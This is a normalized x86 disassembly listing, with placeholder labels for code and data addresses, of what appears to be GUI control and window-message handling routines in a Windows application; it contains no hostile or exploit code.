jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_455244
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43d998
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45e9f0
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_40349c
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_455188
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_40349c
jmp r-xdata
sub_43f224
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408900
mov edi eax
mov eax [ esi + 0x64 ]
call sub_40892c
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43d998
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408758
call sub_4086f4
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4086f4
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43f2cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43f2fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_43f2c0
push ebp
call sub_43f2cc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f34c
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43f3d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43f410
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43ee90
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4550f8
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40349c
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4550f8
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40349c
sub_43f494
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43d968
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43e030
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43f410
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43f4e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43d968
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43f4fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43d968
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43e030
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43f410
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_40349c
sub_43f554
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43ee30
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43edc4
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43ee30
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43f5f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43f410
pop esi
pop ebx
retn
sub_43f615
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43f410
pop esi
pop ebx
retn
sub_43f63b
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43f410
pop esi
pop ebx
retn
sub_43f665
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43f410
pop esi
pop ebx
retn
sub_43f690
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43f6c0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43ee90
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4550f8
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_40349c
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4550f8
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_40349c
sub_43f738
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43f770
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4550f8
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_40349c
sub_43f7a8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43e030
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43f770
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406b0c
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40349c
sub_43f820
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43f770
pop esi
pop ebx
retn
sub_43f840
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43f770
pop esi
pop ebx
retn
sub_43f860
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_4550f8
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_40349c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_448fb4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43f8b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43e020
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43e030
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43efc4
pop esi
retn
sub_43f8f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43eff8
sub_43f9a6
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43e240
mov cl 0x1
sub_43f9e8
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43df98
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43df98
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43fa18
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43fa3c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406b0c
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_40349c
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43efc4
mov [ ebx + 0xc ] eax
sub_43fae0
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43deec
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43deec
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43fb74
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031e8
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43d58c
mov edx [ esp ]
mov eax esi
call sub_43d568
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43d814
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43d858
sub_43fbf8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412988
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43d910
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_4129d8
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43d7b8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fc84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43fb74
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4445f8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43fbf8
pop ecx
jmp r-xdata
sub_43fce4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43fdd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fdd9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43de28
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43ddf8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43ddf8
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404480
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_4040c8
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43dd18
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43fde0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_40349c
sub_43fe0c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43fe2c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43fe4c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43fe6c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43fe8c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43feac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43fecc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a534
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43d44c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40349c
sub_43ff04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ffa0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414518
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44a7c0
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44a8f8
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44a658
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44aa18
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ffa7
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_43ffb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_43ffec
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_43ffb0
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44009c
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_40342c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4400d0
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4400f0
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax edi
call sub_440130
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44015c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_440188
push ebx
